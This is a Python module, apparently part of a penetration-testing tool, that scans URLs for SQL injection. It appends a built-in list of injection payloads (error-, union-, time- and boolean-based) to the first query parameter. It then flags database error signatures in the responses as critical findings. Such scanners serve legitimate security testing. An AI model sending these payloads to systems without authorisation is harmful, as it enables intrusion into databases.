"""
OWASP A03 — SQL Injection Testing Module.
Tests for SQL injection using parameterized payloads.
"""

from __future__ import annotations

from typing import Any, Dict, List, Optional

import aiohttp

from sapt.core.logger import get_logger, log_finding
from sapt.models.models import Finding, Evidence, VulnerabilityType, SeverityLevel


# ── SQLi Payloads ────────────────────────────────────────────────────────────

SQLI_PAYLOADS = [
    # Error-based
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "\" OR 1=1--",
    "' OR 1=1#",
    "1' AND '1'='1",
    "1' AND '1'='2",
    # Union-based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    # Time-based
    "' AND SLEEP(3)--",
    "'; WAITFOR DELAY '0:0:3'--",
    "1' AND (SELECT * FROM (SELECT SLEEP(3))a)--",
    # Boolean-based
    "' AND 1=1 AND 'a'='a",
    "' AND 1=2 AND 'a'='a",
]

SQLI_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql_",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "pg_query",
    "sqlite3.operationalerror",
    "microsoft ole db provider for sql server",
    "ora-01756",
    "sql syntax.*mysql",
    "valid mysql result",
    "syntax error.*postgresql",
    "unterminated.*string",
    "sql command not properly ended",
]


async def test_sqli(
    target_urls: List[str],
    session: Optional[aiohttp.ClientSession] = None,
) -> List[Finding]:
    """Test for SQL injection vulnerabilities."""
    logger = get_logger()
    findings: List[Finding] = []
    close_session = False

    if session is None:
        session = aiohttp.ClientSession()
        close_session = True

    try:
        for url in target_urls:
            if "=" not in url:
                continue

            base_url, params = url.split("?", 1) if "?" in url else (url, "")
            if not params:
                continue

            for payload in SQLI_PAYLOADS[:10]:
                test_url = f"{base_url}?{_inject_payload(params, payload)}"

                try:
                    async with session.get(
                        test_url,
                        timeout=aiohttp.ClientTimeout(total=10),
                    ) as resp:
                        body = await resp.text()
                        body_lower = body.lower()

                        for error_sig in SQLI_ERROR_SIGNATURES:
                            if error_sig in body_lower:
                                finding = Finding(
                                    id=f"sqli_{len(findings)+1:03d}",
                                    target_url=test_url,
                                    vuln_type=VulnerabilityType.SQLI,
                                    severity=SeverityLevel.CRITICAL,
                                    title=f"SQL Injection — Error-based",
                                    description=(
                                        f"SQL error detected in response when injecting payload. "
                                        f"Error signature: '{error_sig}'"
                                    ),
                                    owasp_category="A03",
                                    evidence=[Evidence(
                                        type="http_request",
                                        data=f"GET {test_url}\n\nResponse contains: {error_sig}",
                                    )],
                                    reproduction_steps=[
                                        f"1. Original URL: {url}",
                                        f"2. Payload: {payload}",
                                        f"3. Test URL: {test_url}",
                                        f"4. SQL error found in response: {error_sig}",
                                    ],
                                    tool_source="sapt_sqli",
                                )
                                findings.append(finding)
                                log_finding(finding.title, "critical")
                                break

                except Exception:
                    continue

    finally:
        if close_session:
            await session.close()

    logger.info(f"SQLi testing: {len(findings)} findings")
    return findings


def _inject_payload(params: str, payload: str) -> str:
    """Inject payload into the first parameter value."""
    parts = params.split("&")
    if parts:
        key_val = parts[0].split("=", 1)
        if len(key_val) == 2:
            parts[0] = f"{key_val[0]}={key_val[1]}{payload}"
    return "&".join(parts)
